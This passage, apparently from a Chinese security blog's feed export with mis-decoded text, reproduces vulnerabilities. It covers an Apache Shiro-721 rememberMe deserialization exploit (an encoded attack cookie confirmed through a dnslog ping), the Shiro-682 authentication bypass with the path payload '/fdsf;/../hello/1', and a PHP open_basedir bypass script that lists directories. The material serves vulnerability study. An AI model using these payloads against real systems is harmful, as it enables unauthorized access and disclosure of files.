</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">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</span><br></pre></td></tr></table></figure>

<p><img src="/images/middleware/shiro/720-padding-cookie.png" alt="720-padding-cookie"></p>
<ul>
<li>ä½¿ç”¨æ„é€ çš„rememberMeæ”»å‡»å­—ç¬¦ä¸²é‡æ–°è¯·æ±‚ç½‘ç«™</li>
</ul>
<p><img src="/images/middleware/shiro/721-burp-rememberMe.png" alt="721-burp-rememberMe"></p>
<ul>
<li>æˆåŠŸè§¦å‘payloadï¼Œåœ¨DNSlogè·å–åˆ°ç›®æ ‡IP</li>
</ul>
<p><img src="/images/middleware/shiro/721-dnslog-result.png" alt="721-dnslog-result"></p>
<ul>
<li>â–² 2020-08-22 å› ä¸ºç¯å¢ƒé—®é¢˜ï¼Œå¤šæ¬¡å¤ç°å‡å­˜åœ¨é—®é¢˜ï¼Œæ‰€ä»¥ç”¨<code>ping cedp81j.dnslog.cn</code>æ¥ä»£æ›¿ï¼ŒçŒœæµ‹åŸå› å¦‚ä¸‹<ul>
<li>payloadè¿‡é•¿ï¼Œblocksizeé”™è¯¯</li>
<li>ç¯å¢ƒä¸ºShiro-550çš„ç¯å¢ƒï¼Œæ— æ³•å¤ç°Shiro-721çš„å®éªŒ</li>
</ul>
</li>
</ul>
<h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><ul>
<li><a href="https://www.cnblogs.com/loong-hon/p/10619616.html" target="_blank" rel="noopener">Apache Shiro Javaååºåˆ—åŒ–æ¼æ´åˆ†æ</a></li>
<li><a href="https://www.cnblogs.com/kbhome/p/13061633.html" target="_blank" rel="noopener">shiro java ååºåˆ—æ¼æ´å¤ç°</a></li>
<li><a href="https://www.cnblogs.com/xiaozi/p/13239046.html" target="_blank" rel="noopener">Shiroååºåˆ—åŒ–æ¼æ´åˆ©ç”¨æ±‡æ€»ï¼ˆShiro-550+Shiro-721ï¼‰</a></li>
<li><a href="https://blog.csdn.net/Aaron_Miller/article/details/106475088" target="_blank" rel="noopener">Shiroååºåˆ—åŒ–æ¼æ´</a></li>
<li><a href="https://www.freebuf.com/articles/database/151167.html" target="_blank" rel="noopener">Padding oracle attackè¯¦ç»†è§£æ</a></li>
</ul>
]]></content>
      <categories>
        <category>middleware</category>
      </categories>
  </entry>
  <entry>
    <title>Shiroæƒé™ç»•è¿‡æ¼æ´</title>
    <url>/2020/10/27/md%E6%96%87%E4%BB%B6/shiro_privilge_bypass/</url>
    <content><![CDATA[<h3 id="Shiroæƒé™ç»•è¿‡æ¼æ´ï¼ˆShiro-682ï¼‰"><a href="#Shiroæƒé™ç»•è¿‡æ¼æ´ï¼ˆShiro-682ï¼‰" class="headerlink" title="Shiroæƒé™ç»•è¿‡æ¼æ´ï¼ˆShiro-682ï¼‰"></a>Shiroæƒé™ç»•è¿‡æ¼æ´ï¼ˆShiro-682ï¼‰</h3><blockquote>
<p>CVE-2020-1597</p>
</blockquote>
<h5 id="å½±å“ç‰ˆæœ¬ï¼šApache-Shiro-lt-1-5-2"><a href="#å½±å“ç‰ˆæœ¬ï¼šApache-Shiro-lt-1-5-2" class="headerlink" title="å½±å“ç‰ˆæœ¬ï¼šApache Shiro &lt; 1.5.2"></a>å½±å“ç‰ˆæœ¬ï¼šApache Shiro &lt; 1.5.2</h5><h5 id="æ¼æ´ä»‹ç»"><a href="#æ¼æ´ä»‹ç»" class="headerlink" title="æ¼æ´ä»‹ç»"></a>æ¼æ´ä»‹ç»</h5><ul>
<li>ç”±äºShiroçš„æ‹¦æˆªå™¨å’ŒSpring(Servlet)æ‹¦æˆªå™¨å¯¹äºURIæ¨¡å¼åŒ¹é…çš„å·®å¼‚ï¼Œå¯¼è‡´é‰´æƒé—®é¢˜</li>
</ul>
<h5 id="æ¼æ´åŸå› "><a href="#æ¼æ´åŸå› " class="headerlink" title="æ¼æ´åŸå› "></a>æ¼æ´åŸå› </h5><ul>
<li>åœ¨Springæ¡†æ¶ä¸‹uri = uri + â€˜/â€™å¯ä»¥ç»•è¿‡Shiroé˜²æŠ¤<ul>
<li>åœ¨Spring webé¡¹ç›®ä¸­ï¼Œè¯·æ±‚URI/resource/menuså’ŒURI/resource/menus/éƒ½å¯ä»¥è®¿é—®åˆ°æœåŠ¡å™¨çš„èµ„æº</li>
<li>åœ¨Shiroä¸­çš„URLè·¯å¾„è¡¨è¾¾å¼pathPatternå¯ä»¥æ­£ç¡®åŒ¹é…åˆ°/resource/menusï¼Œä½†ä¸èƒ½æ­£ç¡®åŒ¹é…/resource/menusï¼Œå¯¼è‡´è¿‡æ»¤æ— æ³•æ­£ç¡®åŒ¹é…ï¼Œç»•è¿‡äº†Shiroçš„é˜²æŠ¤æœºåˆ¶</li>
</ul>
</li>
<li>Shiroæ‹¦æˆªå™¨<ul>
<li>Shiroæ¡†æ¶é€šè¿‡æ‹¦æˆªå™¨åŠŸèƒ½æ¥å®ç°å¯¹ç”¨æˆ·è®¿é—®æƒé™çš„æ§åˆ¶å’Œæ‹¦æˆª<ul>
<li>anonä¸ºåŒ¿åæ‹¦æˆªå™¨ï¼Œä¸éœ€è¦ç™»é™†å°±èƒ½è®¿é—®ï¼Œä¸€èˆ¬ç”¨äºé™æ€èµ„æºæˆ–è€…ç§»åŠ¨æ¥å£ -&gt; <code>/index.html = anon</code></li>
<li>authcä¸ºç™»é™†æ‹¦æˆªå™¨ï¼Œéœ€è¦ç™»é™†è®¤è¯æ‰èƒ½è®¿é—®åˆ°çš„èµ„æº  -&gt;<code>/user/** = authc</code></li>
</ul>
</li>
<li>Shiroçš„URLè·¯å¾„è¡¨è¾¾å¼ä¸ºAntæ ¼å¼ï¼Œè·¯å¾„é€šé…ç¬¦æ”¯æŒ<code>? * **</code><ul>
<li><code>?</code>ï¼šåŒ¹é…ä¸€ä¸ªå­—ç¬¦</li>
<li><code>*</code>ï¼šåŒ¹é…é›¶ä¸ªæˆ–å¤šä¸ªå­—ç¬¦</li>
<li><code>**</code>ï¼šåŒ¹é…è·¯å¾„ä¸­çš„é›¶ä¸ªæˆ–å¤šä¸ªå­—ç¬¦</li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h5><ul>
<li>Shiroç‰ˆæœ¬</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>ä¿®æ”¹ShiroConfigé…ç½®æ–‡ä»¶ï¼Œæ·»åŠ authcæ‹¦æˆªå™¨çš„æ‹¦æˆªæ­£åˆ™</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">@Bean</span><br><span class="line">ShiroFilterFactoryBean shiroFilterFactoryBean() &#123;</span><br><span class="line">    ShiroFilterFactoryBean bean = new ShiroFilterFactoryBean();</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    //map.put("/*", "authc");</span><br><span class="line">    map.put("/hello/*", "authc"); </span><br><span class="line">    bean.setFilterChainDefinitionMap(map);</span><br><span class="line">    return bean;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>ä¿®æ”¹è·¯ç”±æ§åˆ¶æ–¹æ³•</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">@GetMapping("/hello/&#123;currentPage&#125;")</span><br><span class="line">    public String hello(@PathVariable Integer currentPage) &#123;</span><br><span class="line">        return "hello";</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>å¯åŠ¨åº”ç”¨<ul>
<li>è®¿é—®/hello/1æ¥å£ï¼Œä¼šè¢«authcæ‹¦æˆªå™¨æ‹¦æˆªï¼Œä¼šè·³è½¬åˆ°ç™»å½•æ¥å£è¿›è¡Œç™»å½•</li>
<li>è®¿é—®/hello/1/ï¼ŒæˆåŠŸç»•è¿‡authcæ‹¦æˆªå™¨æ‹¦æˆªï¼Œç›´æ¥è·å–åˆ°èµ„æº</li>
</ul>
</li>
<li>â–² 2020-08-22 æœ¬å®éªŒå› ä¸ºç¯å¢ƒé—®é¢˜ï¼Œæš‚æ— è¿›è¡Œè¯•éªŒ</li>
</ul>
<h5 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h5><ul>
<li><p>PathMatchingFilterChainResolverä¸‹çš„getChainå‡½æ•°</p>
<ul>
<li>æ ¹æ®URLè·¯å¾„åŒ¹é…ä¸­é…ç½®çš„urlè·¯å¾„è¡¨è¾¾å¼æ¥åŒ¹é…è¾“å…¥çš„URL</li>
<li>åˆ¤æ–­æ˜¯å¦åŒ¹é…æ‹¦æˆªå™¨ï¼ŒåŒ¹é…æˆåŠŸå°†ä¼šè¿”å›å“åº”çš„æ‹¦æˆªå™¨æ‰§è¡Œé“¾</li>
<li>è®©ShiroFitheræ‰§è¡Œæƒé™æ“ä½œçš„</li>
</ul>
</li>
<li><p>pathMatcheså‡½æ•°å…¶æœ€ç»ˆä¼šè°ƒç”¨shiro.util.AntPathMatcherç±»ä¸­doMatchçš„å¯¹äºantæ ¼å¼çš„pathPatternå’ŒrequestURIè¿›è¡ŒåŒ¹é…</p>
<ul>
<li>doMatch:109, AntPathMatcher (org.apache.shiro.util)ï¼Œå½“Shiro çš„Antæ ¼å¼çš„pathPattern ä¸­çš„çš„<code>*</code>é€šé…ç¬¦æ˜¯ä¸æ”¯æŒåŒ¹é…è·¯å¾„çš„ï¼Œæ‰€ä»¥å¯ä»¥ç»•è¿‡æ‹¦æˆªå™¨ï¼Œç›´æ¥è®¿é—®åˆ°èµ„æº</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//pathMatches:135, PathMatchingFilterChainResolver (org.apache.shiro.web.filter.mgt)</span><br><span class="line">protected boolean pathMatches(String pattern, String path) &#123;</span><br><span class="line">        PatternMatcher pathMatcher = this.getPathMatcher();</span><br><span class="line">        return pathMatcher.matches(pattern, path);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="ç‰ˆæœ¬ä¿®å¤ä¸ç»•è¿‡"><a href="#ç‰ˆæœ¬ä¿®å¤ä¸ç»•è¿‡" class="headerlink" title="ç‰ˆæœ¬ä¿®å¤ä¸ç»•è¿‡"></a>ç‰ˆæœ¬ä¿®å¤ä¸ç»•è¿‡</h5><ul>
<li>1.5.0ç‰ˆæœ¬ä¿®å¤<ul>
<li>ä»£ç ä¿®å¤ä½ç½®ä¸ºpathsMatch:125, PathMatchingFilter (org.apache.shiro.web.filter)ï¼Œè¯¥ä¿®å¤æ–¹å¼æ˜¯é€šè¿‡åˆ¤æ–­requestURIæ˜¯å¦ä»¥<code>/</code>ä¸ºç»“å°¾ï¼Œå¦‚æœä»¥<code>/</code>ç»“å°¾çš„è¯ï¼Œåˆ™å»æ‰å°¾éƒ¨çš„<code>/</code>ç¬¦å·åœ¨ä¸URLè¡¨è¾¾å¼è¿›è¡Œæ¯”è¾ƒ</li>
<li>å½“requestURIä¸º<code>/hello/1/</code>ç­‰ä»¥<code>/</code>ä¸ºç»“å°¾çš„URIçš„æ—¶å€™ï¼Œéƒ½ä¼šè¢«æ¸…é™¤æœ€åçš„<code>/</code>å·ï¼Œå†è¿›è¡ŒURLè·¯å¾„åŒ¹é…</li>
</ul>
</li>
<li>&lt; 1.5.1ç‰ˆæœ¬ç»•è¿‡<ul>
<li>payloadï¼š<code>/fdsf;/../hello/1</code></li>
<li>é—®é¢˜åŒæ ·æ˜¯åœ¨getChainå‡½æ•°ä¸­å¯¹äºrequestURIçš„è·å–ä¸­ï¼Œè·å–åˆ°çš„æ˜¯/fdsf</li>
<li>åœ¨RequestUriå‡½æ•°ä¸­æœ€ç»ˆè°ƒç”¨decodeAndCleanUriStringå‡½æ•°å¯¹URIè¿›è¡Œæ¸…æ´—</li>
<li>å¦‚æœURIä¸­å­˜åœ¨<code>;</code>å·çš„è¯ï¼Œåˆ™ä¼šåˆ é™¤å…¶åé¢çš„æ‰€æœ‰å­—ç¬¦ã€‚<code>/fdsf;/../hello/1/</code>æœ€ç»ˆä¹Ÿå°±å˜æˆäº†<code>/fdsf</code> ä»è€Œå¯¼è‡´äº†ç»•è¿‡</li>
</ul>
</li>
<li>1.5.2ç‰ˆæœ¬ä¿®å¤<ul>
<li>è·å–requestURIçš„æ–¹å¼ä»<code>request.getRequestUri</code>ç›´æ¥è·å–çš„æ–¹å¼æ›´æ”¹ä¸ºè·å–requestçš„ContextPathï¼ŒServletPathï¼ŒPathInfoï¼Œç„¶åå†é‡æ–°æ‹¼æ¥è€Œæˆ</li>
</ul>
</li>
</ul>
<h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><ul>
<li><a href="[https://blog.riskivy.com/shiro-%e6%9d%83%e9%99%90%e7%bb%95%e8%bf%87%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%ef%bc%88cve-2020-1957%ef%bc%89/](https://blog.riskivy.com/shiro-æƒé™ç»•è¿‡æ¼æ´åˆ†æï¼ˆcve-2020-1957ï¼‰/)">Shiro æƒé™ç»•è¿‡æ¼æ´åˆ†æï¼ˆCVE-2020-1957ï¼‰</a></li>
<li><a href="https://blog.csdn.net/qq_43645782/article/details/106084263" target="_blank" rel="noopener">Apache Shiro æƒé™ç»•è¿‡æ¼æ´ ï¼ˆShiro-682ï¼‰å¤ç°</a></li>
</ul>
]]></content>
      <categories>
        <category>middleware</category>
      </categories>
  </entry>
  <entry>
    <title>PHPç»•è¿‡open_basedir</title>
    <url>/2020/08/30/bypass_open_basedir/</url>
    <content><![CDATA[<h2 id="PHPç»•è¿‡open-basedir"><a href="#PHPç»•è¿‡open-basedir" class="headerlink" title="PHPç»•è¿‡open_basedir"></a>PHPç»•è¿‡open_basedir</h2><h3 id="0X00-open-basedirç®€ä»‹"><a href="#0X00-open-basedirç®€ä»‹" class="headerlink" title="0X00 open_basedirç®€ä»‹"></a>0X00 open_basedirç®€ä»‹</h3><ul>
<li>open_basediræ˜¯PHPè®¾ç½®ä¸­ä¸ºäº†é˜²å¾¡PHPè·¨ç›®å½•è¿›è¡Œæ–‡ä»¶ï¼ˆç›®å½•ï¼‰è¯»å†™çš„æ–¹æ³•ï¼Œæ‰€æœ‰PHPä¸­æœ‰å…³æ–‡ä»¶è¯»ã€å†™çš„å‡½æ•°éƒ½ä¼šç»è¿‡open_basedirçš„æ£€æŸ¥</li>
<li>open_basedirå®é™…ä¸Šæ˜¯ä¸€äº›ç›®å½•çš„é›†åˆï¼Œåœ¨å®šä¹‰äº†open_basedirä»¥åï¼Œphpå¯ä»¥è¯»å†™çš„æ–‡ä»¶ã€ç›®å½•éƒ½å°†è¢«é™åˆ¶åœ¨è¿™äº›ç›®å½•ä¸­</li>
<li>è®¾ç½®open_basedirçš„æ–¹æ³•ï¼Œåœ¨linuxä¸‹ï¼Œä¸åŒçš„ç›®å½•ç”±â€œ:â€åˆ†å‰²ï¼Œå¦‚â€œ/var/www/:/tmp/â€ï¼›åœ¨Windowsä¸‹ä¸åŒç›®å½•ç”±â€œ;â€åˆ†å‰²ï¼Œå¦‚â€œc:/www;c:/windows/tempâ€</li>
</ul>
<h3 id="0X01-åˆ—ç›®å½•"><a href="#0X01-åˆ—ç›®å½•" class="headerlink" title="0X01 åˆ—ç›®å½•"></a>0X01 åˆ—ç›®å½•</h3><ul>
<li>â­ æ–‡ç« åˆ†ææ¥è‡ªPç‰›ï¼Œ<a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html" target="_blank" rel="noopener">PHPç»•è¿‡open_basediråˆ—ç›®å½•çš„ç ”ç©¶</a></li>
<li>â–² è®¾ç½®open_basedirä¸º/var/www/html/:/tmp/</li>
</ul>
<h5 id="åˆ©ç”¨DirectoryIterator-Glob"><a href="#åˆ©ç”¨DirectoryIterator-Glob" class="headerlink" title="åˆ©ç”¨DirectoryIterator + Glob"></a>åˆ©ç”¨DirectoryIterator + Glob</h5><ul>
<li>æ¦‚å¿µ<ul>
<li>DirectoryIterator æ˜¯php5ä¸­å¢åŠ çš„ä¸€ä¸ªç±»ï¼Œä¸ºç”¨æˆ·æä¾›ä¸€ä¸ªç®€å•çš„æŸ¥çœ‹ç›®å½•çš„æ¥å£</li>
<li>glob: æ•°æ®æµåŒ…è£…å™¨æ˜¯ä» PHP 5.3.0 èµ·å¼€å§‹æœ‰æ•ˆçš„ï¼Œç”¨æ¥æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„</li>
<li>â–² ç»“åˆDirectoryIterator + Globï¼Œå¯å¯¹ç›®å½•è¿›è¡Œéå†</li>
</ul>
</li>
<li>å½±å“ç‰ˆæœ¬ï¼šPHP &gt;= 5.3.0</li>
<li>æµ‹è¯•ä»£ç </li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">printf(<span class="string">'&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;'</span>, ini_get(<span class="string">'open_basedir'</span>));</span><br><span class="line">$file_list = <span class="keyword">array</span>();</span><br><span class="line"><span class="comment">// normal files</span></span><br><span class="line">$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///*"</span>);</span><br><span class="line"><span class="keyword">foreach</span>($it <span class="keyword">as</span> $f) &#123;</span><br><span class="line">    $file_list[] = $f-&gt;__toString();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// special files (starting with a dot(.))</span></span><br><span class="line">$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///.*"</span>);</span><br><span class="line"><span class="keyword">foreach</span>($it <span class="keyword">as</span> $f) &#123;</span><br><span class="line">    $file_list[] = $f-&gt;__toString();</span><br><span class="line">&#125;</span><br><span class="line">sort($file_list);</span><br><span class="line"><span class="keyword">foreach</span>($file_list <span class="keyword">as</span> $f)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&#123;$f&#125;&lt;br/&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php-about/open-base-dir/directoryiterator_glob_list.png" alt="directoryiterator_glob_list"></p>
<h5 id="realpath"><a href="#realpath" class="headerlink" title="realpath"></a>realpath</h5><ul>
<li>æ¦‚å¿µ<ul>
<li>Realpathå‡½æ•°æ˜¯phpä¸­å°†ä¸€ä¸ªè·¯å¾„è§„èŒƒåŒ–æˆä¸ºç»å¯¹è·¯å¾„çš„æ–¹æ³•ï¼Œå®ƒå¯ä»¥å»æ‰å¤šä½™çš„../æˆ–./ç­‰è·³è½¬å­—ç¬¦ï¼Œèƒ½å°†ç›¸å¯¹è·¯å¾„è½¬æ¢æˆç»å¯¹è·¯å¾„ï¼ˆåœ¨å¼€å¯äº†open_basedirä¹‹åï¼‰<ul>
<li>å½“æˆ‘ä»¬ä¼ å…¥çš„è·¯å¾„æ˜¯ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶ï¼ˆç›®å½•ï¼‰æ—¶ï¼Œå®ƒå°†è¿”å›false</li>
<li>å½“æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªä¸åœ¨open_basediré‡Œçš„æ–‡ä»¶ï¼ˆç›®å½•ï¼‰æ—¶ï¼Œä»–å°†æŠ›å‡ºé”™è¯¯ï¼ˆFile is not within the allowed path(s)ï¼‰</li>
</ul>
</li>
</ul>
</li>
<li>æš´åŠ›åˆ—ä¸¾åˆ©ç”¨ï¼šå½“çŒœè§£æ ¹ç›®å½•ï¼ˆä¸åœ¨open_basedirä¸­ï¼‰ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œåªç”¨å†™ä¸€ä¸ªæ•æ‰phpé”™è¯¯çš„å‡½æ•°err_handle()ã€‚å½“çŒœè§£æŸä¸ªå­˜åœ¨çš„æ–‡ä»¶æ—¶ï¼Œä¼šå› æŠ›å‡ºé”™è¯¯è€Œè¿›å…¥err_handle()ï¼Œå½“çŒœè§£æŸä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶æ—¶ï¼Œå°†ä¸ä¼šè¿›å…¥err_handle()  </li>
<li>æµ‹è¯•ä»£ç <ul>
<li>å€ŸåŠ©Windowsä¸‹çš„ç‰¹æ®Šçš„é€šé…ç¬¦ï¼š<code>&lt;  &gt;</code>  -&gt;  æé«˜æš´åŠ›ç ´è§£æ•ˆç‡</li>
<li>é¦–å…ˆè®¾ç½®open_basedirä¸ºå½“å‰ç›®å½•ï¼Œå¹¶æšä¸¾ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œå°†é”™è¯¯å¤„ç†äº¤ç»™isexistså‡½æ•°ï¼Œåœ¨isexistså‡½æ•°ä¸­åŒ¹é…å‡ºç›®å½•åç§°ï¼Œå¹¶æ‰“å°å‡ºæ¥</li>
<li>â–² æ­¤æ–¹æ³•æ˜¯windowsä¸‹phpç‰ˆæœ¬é€šç”¨ï¼Œåœ¨Linuxç¯å¢ƒä¸‹å°±åªèƒ½æš´åŠ›ç ´è§£äº†</li>
</ul>
</li>
